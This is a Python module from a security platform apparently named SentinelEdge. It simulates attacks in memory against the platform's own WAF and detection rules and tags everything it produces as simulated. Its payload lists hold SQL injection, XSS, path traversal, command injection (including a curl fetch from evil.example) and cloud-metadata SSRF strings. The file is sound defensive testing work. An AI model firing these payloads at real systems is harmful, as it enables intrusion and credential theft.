"""Attack simulator (spec §23): labelled, synthetic attack activity against SentinelEdge only.

Safe by construction:
* No network traffic. The simulator builds synthetic request records in memory and runs them
  through the same detection code as real traffic. Its API takes a scenario name and nothing
  else (no URL, host or address), so it cannot be pointed at any system, including this one.
* Everything it produces is SIMULATED (ADR-0009): events, detections and incidents. Correlation
  never mixes provenance, so a simulation cannot raise or join a real incident.
* Addresses come from the IETF documentation ranges (RFC 5737: 192.0.2.0/24,
  198.51.100.0/24, 203.0.113.0/24) and names from the reserved .example domain (RFC 2606), so no
  simulated value belongs to a real person or network. Advisories are synthetic (SIM-YYYY-NNNN).
* Runs are deterministic for a seed, audited (`simulator.run`) and rate limited.

The simulated WAF decides with the real HTTP analysis rules (app.security.http_analysis). Each
rule's mode (block, count, off) can be changed here, the only place in SentinelEdge where a WAF
rule can be switched from the dashboard; real AWS WAF rules change only through Terraform
(ADR-0008, Phase 5). With a rule in count or off mode, the request "reaches" SentinelEdge and
the application-layer analysis records it as well: the simulation shows defense in depth.
"""

from __future__ import annotations

import json
import random
import uuid
from collections.abc import Iterator
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import StrEnum
from typing import Any
from urllib.parse import urlencode

from sqlalchemy import func, select
from sqlalchemy.orm import Session

from app.core.authz import Principal
from app.core.clock import utcnow
from app.core.errors import ApiError
from app.core.provenance import Provenance
from app.models.audit import AuditResult
from app.models.incident import Incident
from app.models.security_event import (
    EventCategory,
    EventSource,
    Outcome,
    SecurityEvent,
    Severity,
)
from app.models.simulation import SimulatedWafRule, SimulationRun, WafMode
from app.models.user import User
from app.security.http_analysis import RULES, Analysis, Finding, InspectedRequest, analyze
from app.services import audit, correlation, security_events
from app.services.audit import AuditAction, RequestContext
from app.services.security_events import EventContext

SIM = Provenance.SIMULATED
WEB_ACL = "sentineledge-simulated-acl"
SPREAD = timedelta(minutes=5)  # simulated activity is spread over the last five minutes
BROWSER = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0"

# Attacker addresses (RFC 5737) and the country a WAF log would attribute them to.
ATTACKERS: dict[str, str] = {
    "203.0.113.24": "NL",
    "203.0.113.77": "BR",
    "203.0.113.130": "SG",
    "203.0.113.201": "US",
    "198.51.100.66": "DE",
    "192.0.2.45": "IN",
}
USERS = tuple(f"198.51.100.{n}" for n in range(10, 18))

# A comparable AWS managed rule group for each family of rules (informational: the simulated
# WAF runs SentinelEdge's own rules, not AWS's).
COMPARABLE_GROUP = {
    "SQLI": "AWSManagedRulesSQLiRuleSet",
    "XSS": "AWSManagedRulesCommonRuleSet (CrossSiteScripting)",
    "TRAV": "AWSManagedRulesLinuxRuleSet (LFI)",
    "CMDI": "AWSManagedRulesUnixRuleSet",
    "SSRF": "AWSManagedRulesCommonRuleSet (EC2MetaDataSSRF)",
    "SCAN": "AWSManagedRulesCommonRuleSet (UserAgent_BadBots)",
    "RECON": "AWSManagedRulesKnownBadInputsRuleSet",
}


class Scenario(StrEnum):
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    SSRF = "ssrf"
    CREDENTIAL_STUFFING = "credential_stuffing"
    BOT_ACTIVITY = "bot_activity"
    API_ABUSE = "api_abuse"
    SUSPICIOUS_AUTH = "suspicious_authentication"
    CERTIFICATE_EXPIRY = "certificate_expiry"
    VULNERABLE_DEPENDENCY = "vulnerable_dependency"


@dataclass(frozen=True)
class ScenarioInfo:
    scenario: Scenario
    name: str
    description: str
    demonstrates: str


CATALOGUE: tuple[ScenarioInfo, ...] = (
    ScenarioInfo(
        Scenario.SQL_INJECTION,
        "SQL injection",
        "An unauthenticated attacker sends SQL injection payloads to sign-in, password reset "
        "and query parameters, among ordinary user traffic.",
        "Simulated WAF blocks (SQLi rules), app-layer detection when a rule only counts, "
        "injection campaign detection (COR-003), incident when payloads reach the app",
    ),
    ScenarioInfo(
        Scenario.XSS,
        "Cross-site scripting",
        "Script tags, event handlers and javascript: URIs in parameters and JSON fields.",
        "XSS rules at the simulated WAF and in the app, injection campaign detection",
    ),
    ScenarioInfo(
        Scenario.PATH_TRAVERSAL,
        "Path traversal",
        "Encoded and double-encoded ../ sequences and requests for /etc/passwd and win.ini.",
        "Traversal rules, double-decoding, injection campaign detection",
    ),
    ScenarioInfo(
        Scenario.COMMAND_INJECTION,
        "Command injection",
        "Shell commands chained with ; | && and $( ) in parameters.",
        "Command injection rule, injection campaign detection",
    ),
    ScenarioInfo(
        Scenario.SSRF,
        "Server-side request forgery",
        "Cloud metadata addresses, loopback URLs and gopher:// or file:// schemes in "
        "callback-style parameters.",
        "SSRF rules (SentinelEdge has no fetch endpoint: the attempts fail by design)",
    ),
    ScenarioInfo(
        Scenario.CREDENTIAL_STUFFING,
        "Credential stuffing",
        "Two addresses try leaked credentials against a dozen accounts; one sign-in succeeds.",
        "Credential stuffing detection (COR-001), sign-in from a stuffing source (COR-007), "
        "high-severity incident",
    ),
    ScenarioInfo(
        Scenario.BOT_ACTIVITY,
        "Bot and scanner activity",
        "Scanner user agents and reconnaissance requests for .env, .git and admin paths.",
        "Scanner and recon rules, automated scanning detection (COR-006, medium: no incident)",
    ),
    ScenarioInfo(
        Scenario.API_ABUSE,
        "API abuse",
        "One address keeps tripping rate limits while a signed-in account enumerates other "
        "users' records.",
        "API abuse detection (COR-005), authorization probing (COR-004, BOLA) and an incident",
    ),
    ScenarioInfo(
        Scenario.SUSPICIOUS_AUTH,
        "Suspicious authentication",
        "Repeated second-factor failures, then a stolen refresh token is replayed.",
        "Token theft opens an incident on its own (refresh-token reuse detection)",
    ),
    ScenarioInfo(
        Scenario.CERTIFICATE_EXPIRY,
        "Certificate expiration",
        "One certificate has expired after a failed renewal; another expires in 12 days.",
        "Certificate monitoring events (simulated until ACM monitoring in Phase 5); an "
        "expired certificate opens a critical incident",
    ),
    ScenarioInfo(
        Scenario.VULNERABLE_DEPENDENCY,
        "Vulnerable dependency",
        "A synthetic critical advisory in a direct dependency, and a medium one.",
        "Dependency findings (simulated until scanning in Phase 8); a critical finding "
        "opens an incident",
    ),
)

PAYLOADS: dict[Scenario, tuple[str, ...]] = {
    Scenario.SQL_INJECTION: (
        "1 UNION ALL SELECT username,password FROM users",
        "x' OR '1'='1",
        "admin'--",
        "1; DROP TABLE users",
        "1 AND pg_sleep(5)",
        "1/**/union/**/select/**/1",
        "' or 1=1 --",
        "1 and @@version",
    ),
    Scenario.XSS: (
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=//evil.example>",
        "<svg onload=alert(1)>",
    ),
    Scenario.PATH_TRAVERSAL: (
        "../../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252fsecrets",
        "..\\..\\windows\\win.ini",
        "/proc/self/environ",
    ),
    Scenario.COMMAND_INJECTION: (
        "8.8.8.8; cat /etc/hosts",
        "x | whoami",
        "$(curl http://evil.example/x.sh)",
        "a && id",
        "`uname -a`",
    ),
    Scenario.SSRF: (
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://127.0.0.1:8000/admin",
        "file:///etc/passwd",
        "gopher://10.0.0.5:6379/_INFO",
        "http://metadata.google.internal/computeMetadata/v1/",
    ),
}
ATTACK_UA: dict[Scenario, str] = {
    # Not a scanner fingerprint: the bad-bot rule would block it first and hide what the SQL
    # injection rules do (the bot scenario covers scanner user agents).
    Scenario.SQL_INJECTION: "python-requests/2.32.3",
    Scenario.XSS: "python-requests/2.32.3",
    Scenario.PATH_TRAVERSAL: "curl/8.10.1",
    Scenario.COMMAND_INJECTION: "python-requests/2.32.3",
    Scenario.SSRF: "Go-http-client/1.1",
}


@dataclass(frozen=True)
class Target:
    """A real SentinelEdge endpoint and what it returns to an unauthenticated attacker."""

    method: str
    path: str
    field: str
    in_body: bool
    status: int


TARGETS = (
    Target("POST", "/api/v1/auth/login", "email", True, 422),
    Target("POST", "/api/v1/auth/password/forgot", "email", True, 422),
    Target("GET", "/api/v1/audit-logs", "actor", False, 401),
    Target("GET", "/api/v1/security-events", "source_ip", False, 401),
    Target("GET", "/api/v1/api-security/inventory", "callback", False, 401),
)
RECON_PATHS = ("/api/.env", "/api/.git/config", "/api/wp-login.php", "/api/actuator/env")
SCANNER_UAS = (
    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
    "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)",
    "sqlmap/1.8.4#stable (https://sqlmap.org)",
)


def comparable_group(rule_id: str) -> str:
    return COMPARABLE_GROUP.get(rule_id.split("-", 1)[0], "AWSManagedRulesCommonRuleSet")


def waf_modes(db: Session) -> dict[str, WafMode]:
    """Mode of every simulated WAF rule; block unless changed."""
    stored = {r.rule_id: r.mode for r in db.scalars(select(SimulatedWafRule)).all()}
    return {rule.rule_id: stored.get(rule.rule_id, WafMode.BLOCK) for rule in RULES}


@dataclass
class _Counters:
    requests: int = 0
    benign: int = 0
    blocked: int = 0
    counted: int = 0
    reached_app: int = 0


@dataclass
class _Run:
    """One scenario execution: a clock, a seeded random source and the WAF modes in force."""

    db: Session
    run_id: uuid.UUID
    scenario: Scenario
    rng: random.Random
    modes: dict[str, WafMode]
    clock: datetime
    end: datetime
    counters: _Counters = field(default_factory=_Counters)

    def tick(self) -> datetime:
        """Advance simulated time by a few seconds, never past the end of the run."""
        self.clock = min(self.end, self.clock + timedelta(seconds=self.rng.uniform(0.5, 4.0)))
        return self.clock

    def evidence(self, **extra: Any) -> dict[str, Any]:
        return {"simulation_run": str(self.run_id), "scenario": str(self.scenario), **extra}

    def event(
        self,
        *,
        source: EventSource,
        category: EventCategory,
        severity: Severity,
        outcome: Outcome,
        title: str,
        at: datetime,
        ctx: EventContext,
        rule_id: str | None = None,
        **evidence: Any,
    ) -> SecurityEvent:
        return security_events.record_event(
            self.db,
            source=source,
            category=category,
            severity=severity,
            outcome=outcome,
            title=title,
            rule_id=rule_id,
            provenance=SIM,
            occurred_at=at,
            ctx=ctx,
            evidence=self.evidence(**evidence),
        )


def _request(target: Target, payload: str, user_agent: str) -> InspectedRequest:
    if target.in_body:
        return InspectedRequest(
            method=target.method,
            path=target.path,
            user_agent=user_agent,
            content_type="application/json",
            body=json.dumps({target.field: payload}).encode(),
        )
    return InspectedRequest(
        method=target.method,
        path=target.path,
        user_agent=user_agent,
        query_string=urlencode({target.field: payload}),
    )


def _waf_decision(
    analysis: Analysis, modes: dict[str, WafMode]
) -> tuple[WafMode | None, list[Finding]]:
    """AWS WAF semantics: the first matching rule in BLOCK terminates the request; COUNT
    matches are logged and the request continues; rules that are OFF do not evaluate."""
    for finding in analysis.findings:
        if modes.get(finding.rule_id, WafMode.BLOCK) is WafMode.BLOCK:
            return WafMode.BLOCK, [finding]
    counted = [f for f in analysis.findings if modes.get(f.rule_id) is WafMode.COUNT]
    return (WafMode.COUNT, counted) if counted else (None, [])


def _send(
    run: _Run,
    request: InspectedRequest,
    *,
    ip: str,
    endpoint: str,
    status: int,
    route_matched: bool = True,
) -> None:
    """One simulated request through the simulated WAF and, if it gets through, the app."""
    run.counters.requests += 1
    at = run.tick()
    analysis = analyze(request)
    if not analysis:
        run.counters.benign += 1
        return
    mode, findings = _waf_decision(analysis, run.modes)
    waf_log = {
        "web_acl": WEB_ACL,
        "country": ATTACKERS.get(ip),
        "uri": request.path,
        "matched_rules": [
            {"rule_id": f.rule_id, "comparable_group": comparable_group(f.rule_id)}
            for f in findings
        ],
    }
    ctx = EventContext(
        source_ip=ip,
        user_agent=request.user_agent,
        method=request.method,
        endpoint=endpoint,
        status_code=403 if mode is WafMode.BLOCK else status,
    )
    if mode is not None:
        lead = findings[0]
        verb = "blocked" if mode is WafMode.BLOCK else "counted (not blocked)"
        run.event(
            source=EventSource.WAF,
            category=lead.category,
            severity=lead.severity,
            outcome=Outcome.BLOCKED if mode is WafMode.BLOCK else Outcome.DETECTED,
            title=f"{lead.description}: {verb} by the simulated WAF",
            at=at,
            ctx=ctx,
            rule_id=lead.rule_id,
            waf={**waf_log, "action": mode.value.upper()},
            country=ATTACKERS.get(ip),
            findings=[
                {
                    "rule_id": f.rule_id,
                    "location": f.location,
                    "field": f.field,
                    "snippet": f.snippet,
                }
                for f in analysis.findings
            ],
        )
        if mode is WafMode.BLOCK:
            run.counters.blocked += 1
            return
        run.counters.counted += 1
    # The request reached SentinelEdge: the application-layer analysis (detect-only) sees it.
    run.counters.reached_app += 1
    security_events.record_http_analysis(
        run.db,
        analysis,
        ctx,
        provenance=SIM,
        occurred_at=at,
        extra_evidence=run.evidence(country=ATTACKERS.get(ip), route_matched=route_matched),
    )


def _benign(run: _Run, n: int) -> None:
    for _ in range(n):
        target = run.rng.choice(TARGETS)
        ip = run.rng.choice(USERS)
        value = run.rng.choice(
            ("alex@corp.example", "2026-10-07", "auth.login", "kim@corp.example")
        )
        _send(run, _request(target, value, BROWSER), ip=ip, endpoint=target.path, status=200)


def _injection(run: _Run) -> None:
    attacker = run.rng.choice(tuple(ATTACKERS))
    attacks = [
        (run.rng.choice(TARGETS), payload) for payload in PAYLOADS[run.scenario] for _ in range(2)
    ]
    run.rng.shuffle(attacks)
    for i, (target, payload) in enumerate(attacks):
        if i % 2 == 0:
            _benign(run, 2)
        _send(
            run,
            _request(target, payload, ATTACK_UA[run.scenario]),
            ip=attacker,
            endpoint=target.path,
            status=target.status,
        )


def _failure(run: _Run, *, ip: str, account: str, ua: str, reason: str, mfa: bool = False) -> None:
    run.event(
        source=EventSource.AUTH,
        category=EventCategory.AUTH_FAILURE,
        severity=Severity.LOW,
        outcome=Outcome.REJECTED,
        title="Failed second-factor verification" if mfa else "Failed sign-in",
        at=run.tick(),
        ctx=EventContext(
            source_ip=ip,
            user_agent=ua,
            method="POST",
            endpoint="/api/v1/auth/mfa/verify" if mfa else "/api/v1/auth/login",
            status_code=401,
            actor_label=account,
        ),
        reason=reason,
    )


def _credential_stuffing(run: _Run) -> None:
    accounts = [f"user{n:02d}@corp.example" for n in range(1, 13)]
    first, second = "203.0.113.24", "203.0.113.77"
    ua = "python-requests/2.32.3"
    for i in range(36):
        ip = first if i % 3 else second
        account = accounts[(i * 5) % len(accounts)]
        reason = "bad_password" if i % 4 else "unknown_account"
        _failure(run, ip=ip, account=account, ua=ua, reason=reason)
        if i % 9 == 0:  # ordinary users mistyping, for realism
            _failure(
                run,
                ip=run.rng.choice(USERS),
                account="kim@corp.example",
                ua=BROWSER,
                reason="bad_password",
            )
    # One of the leaked credentials works.
    correlation.on_sign_in(
        run.db,
        provenance=SIM,
        source_ip=first,
        account=accounts[6],
        actor_id=None,
        occurred_at=run.tick(),
        user_agent=ua,
        endpoint="/api/v1/auth/login",
    )


def _bot_activity(run: _Run) -> None:
    scanner = "203.0.113.130"
    for i, ua in enumerate(SCANNER_UAS * 2):
        target = TARGETS[i % len(TARGETS)]
        _send(run, _request(target, "test", ua), ip=scanner, endpoint=target.path, status=401)
    for path in RECON_PATHS:
        request = InspectedRequest(method="GET", path=path, user_agent=BROWSER, route_matched=False)
        _send(run, request, ip=scanner, endpoint=path, status=404, route_matched=False)
    _benign(run, 6)


def _api_abuse(run: _Run) -> None:
    abuser = "203.0.113.201"
    for policy, endpoint, limit in (
        ("ip_global", "/api/v1/incidents", "600 / min per IP"),
        ("read", "/api/v1/security-events", "120 / min per user"),
        ("ip_global", "/api/v1/users/{user_id}", "600 / min per IP"),
        ("read", "/api/v1/incidents", "120 / min per user"),
    ):
        run.event(
            source=EventSource.RATE_LIMIT,
            category=EventCategory.RATE_LIMIT,
            severity=Severity.MEDIUM,
            outcome=Outcome.THROTTLED,
            title=f"Rate limit exceeded: {policy}",
            at=run.tick(),
            ctx=EventContext(
                source_ip=abuser,
                user_agent="python-httpx/0.28.1",
                method="GET",
                endpoint=endpoint,
                status_code=429,
                actor_label="contractor@corp.example",
            ),
            policy=policy,
            limit=limit,
        )
    for _ in range(6):
        run.event(
            source=EventSource.AUTHZ,
            category=EventCategory.BOLA,
            severity=Severity.MEDIUM,
            outcome=Outcome.REJECTED,
            title="Attempt to read another user's record",
            at=run.tick(),
            ctx=EventContext(
                source_ip=abuser,
                user_agent="python-httpx/0.28.1",
                method="GET",
                endpoint="/api/v1/users/{user_id}",
                status_code=404,
                actor_label="contractor@corp.example",
            ),
            resource=f"user:{uuid.UUID(int=run.rng.getrandbits(128), version=4)}",
            reason="not_owner",
        )


def _suspicious_auth(run: _Run) -> None:
    ip, account = "198.51.100.66", "alice@corp.example"
    for _ in range(4):
        _failure(run, ip=ip, account=account, ua=BROWSER, reason="bad_code", mfa=True)
    run.event(
        source=EventSource.AUTH,
        category=EventCategory.TOKEN_THEFT,
        severity=Severity.HIGH,
        outcome=Outcome.REJECTED,
        title="Rotated refresh token replayed: likely token theft",
        at=run.tick(),
        ctx=EventContext(
            source_ip=ip,
            user_agent="curl/8.10.1",
            method="POST",
            endpoint="/api/v1/auth/refresh",
            status_code=401,
            actor_label=account,
        ),
        reason="refresh_token_reuse",
        session_revoked=True,
    )


def _certificate_expiry(run: _Run) -> None:
    now = run.end
    for domain, days, severity, renewal in (
        (
            "portal.sentineledge.example",
            -2,
            Severity.CRITICAL,
            "FAILED: DNS validation CNAME missing",
        ),
        ("api.sentineledge.example", 12, Severity.MEDIUM, "PENDING_AUTO_RENEWAL"),
    ):
        expired = days < 0
        run.event(
            source=EventSource.CERTIFICATE,
            category=EventCategory.CERTIFICATE,
            severity=severity,
            outcome=Outcome.DETECTED,
            title=(
                f"Certificate for {domain} expired {-days} days ago"
                if expired
                else f"Certificate for {domain} expires in {days} days"
            ),
            at=run.tick(),
            ctx=EventContext(),
            domain=domain,
            issuer="Amazon RSA 2048 M02 (simulated)",
            not_after=(now + timedelta(days=days)).date().isoformat(),
            days_remaining=days,
            renewal_status=renewal,
        )


def _vulnerable_dependency(run: _Run) -> None:
    for advisory, package, version, fixed, cvss, severity, summary in (
        ("SIM-2026-0001", "demo-yaml-parser", "4.1.0", "4.1.3", 9.8, Severity.CRITICAL,
         "remote code execution through unsafe tag handling"),
        ("SIM-2026-0002", "demo-http-client", "2.0.1", "2.0.4", 5.3, Severity.MEDIUM,
         "redirects can leak an Authorization header"),
    ):  # fmt: skip
        run.event(
            source=EventSource.DEPENDENCY,
            category=EventCategory.VULNERABLE_DEPENDENCY,
            severity=severity,
            outcome=Outcome.DETECTED,
            title=f"{advisory}: {summary} in {package} {version}",
            at=run.tick(),
            ctx=EventContext(),
            advisory=advisory,
            package=package,
            installed=version,
            fixed_in=fixed,
            cvss=str(cvss),
            ecosystem="PyPI",
            note="Synthetic advisory for simulation: not a real CVE.",
        )


HANDLERS = {
    Scenario.SQL_INJECTION: _injection,
    Scenario.XSS: _injection,
    Scenario.PATH_TRAVERSAL: _injection,
    Scenario.COMMAND_INJECTION: _injection,
    Scenario.SSRF: _injection,
    Scenario.CREDENTIAL_STUFFING: _credential_stuffing,
    Scenario.BOT_ACTIVITY: _bot_activity,
    Scenario.API_ABUSE: _api_abuse,
    Scenario.SUSPICIOUS_AUTH: _suspicious_auth,
    Scenario.CERTIFICATE_EXPIRY: _certificate_expiry,
    Scenario.VULNERABLE_DEPENDENCY: _vulnerable_dependency,
}


def run_scenario(
    db: Session,
    principal: Principal,
    scenario: Scenario,
    ctx: RequestContext,
    seed: int | None = None,
) -> SimulationRun:
    """Run one scenario in a single transaction and record what it produced."""
    correlation.lock(db)  # serialize with correlation, so the produced events are ours alone
    started = utcnow()
    run_id = uuid.uuid4()
    seed = seed if seed is not None else int.from_bytes(run_id.bytes[:3], "big")
    start_seq = db.scalar(select(func.coalesce(func.max(SecurityEvent.seq), 0))) or 0
    run = _Run(
        db=db,
        run_id=run_id,
        scenario=scenario,
        rng=random.Random(seed),  # noqa: S311 - synthetic data, not security  # nosec B311
        modes=waf_modes(db),
        clock=started - SPREAD,
        end=started,
    )
    HANDLERS[scenario](run)

    produced = list(
        db.scalars(
            select(SecurityEvent)
            .where(SecurityEvent.seq > start_seq, SecurityEvent.provenance == SIM)
            .order_by(SecurityEvent.seq)
        ).all()
    )
    detections = [e for e in produced if e.source is EventSource.CORRELATION]
    incident_ids = {e.incident_id for e in produced if e.incident_id is not None}
    touched = (
        list(db.scalars(select(Incident).where(Incident.id.in_(incident_ids))).all())
        if incident_ids
        else []
    )
    counters = run.counters
    summary: dict[str, Any] = {
        "requests": {
            "total": counters.requests,
            "benign": counters.benign,
            "blocked_by_waf": counters.blocked,
            "counted_by_waf": counters.counted,
            "reached_app": counters.reached_app,
        },
        "events": len(produced) - len(detections),
        "detections": [
            {"rule_id": d.rule_id, "title": d.title, "severity": str(d.severity)}
            for d in detections
        ],
        "incidents": [
            {
                "id": str(i.id),
                "reference": i.reference,
                "title": i.title,
                "severity": str(i.severity),
                "opened": i.created_at >= started,
            }
            for i in sorted(touched, key=lambda i: i.number)
        ],
        "waf_modes": {k: v.value for k, v in run.modes.items() if v is not WafMode.BLOCK},
    }
    record = SimulationRun(
        id=run_id,
        scenario=scenario.value,
        started_by_id=principal.user.id,
        started_by_label=principal.user.email,
        started_at=started,
        completed_at=utcnow(),
        seed=seed,
        summary=summary,
    )
    db.add(record)
    db.flush()
    audit.record(
        db,
        action=AuditAction.SIMULATION_RUN,
        result=AuditResult.SUCCESS,
        actor=principal.user,
        ctx=ctx,
        resource_type="simulation",
        resource_id=str(run_id),
        details={
            "scenario": scenario.value,
            "reference": record.reference,
            "events": summary["events"],
            "detections": len(detections),
            "incidents": [i["reference"] for i in summary["incidents"]],
        },
    )
    db.commit()
    return record


def set_waf_mode(
    db: Session, principal: Principal, rule_id: str, mode: WafMode, ctx: RequestContext
) -> WafMode:
    """Change one SIMULATED WAF rule. Nothing outside the simulator is affected."""
    apply_waf_mode(db, principal.user, rule_id, mode, ctx)
    db.commit()
    return mode


def apply_waf_mode(
    db: Session,
    actor: User,
    rule_id: str,
    mode: WafMode,
    ctx: RequestContext,
    change: str | None = None,
) -> WafMode:
    """Set a SIMULATED WAF rule's mode in the caller's transaction and audit it; returns the
    mode it replaced. `change` names the change request that made it, if one did."""
    if rule_id not in {r.rule_id for r in RULES}:
        raise ApiError(404, "not_found", "Not Found")
    current = db.get(SimulatedWafRule, rule_id, with_for_update=True)
    before = current.mode if current else WafMode.BLOCK
    if current is None:
        current = SimulatedWafRule(
            rule_id=rule_id, mode=mode, updated_at=utcnow(), updated_by_label=actor.email
        )
        db.add(current)
    else:
        current.mode = mode
        current.updated_at = utcnow()
        current.updated_by_label = actor.email
    details = {"from": before.value, "to": mode.value, "provenance": "SIMULATED"}
    if change:
        details["change_request"] = change
    audit.record(
        db,
        action=AuditAction.SIMULATED_WAF_RULE_CHANGED,
        result=AuditResult.SUCCESS,
        actor=actor,
        ctx=ctx,
        resource_type="simulated_waf_rule",
        resource_id=rule_id,
        details=details,
    )
    return before


def waf_rule_ids() -> frozenset[str]:
    return frozenset(r.rule_id for r in RULES)


def iter_rules(
    db: Session, since: datetime
) -> Iterator[tuple[Any, WafMode, int, SimulatedWafRule | None]]:
    """(rule, mode, simulated WAF matches since `since`, stored state) for every rule."""
    stored = {r.rule_id: r for r in db.scalars(select(SimulatedWafRule)).all()}
    matches = dict(
        db.execute(
            select(SecurityEvent.rule_id, func.count())
            .where(
                SecurityEvent.source == EventSource.WAF,
                SecurityEvent.provenance == SIM,
                SecurityEvent.occurred_at >= since,
            )
            .group_by(SecurityEvent.rule_id)
        ).all()
    )
    for rule in RULES:
        state = stored.get(rule.rule_id)
        yield rule, state.mode if state else WafMode.BLOCK, int(matches.get(rule.rule_id, 0)), state
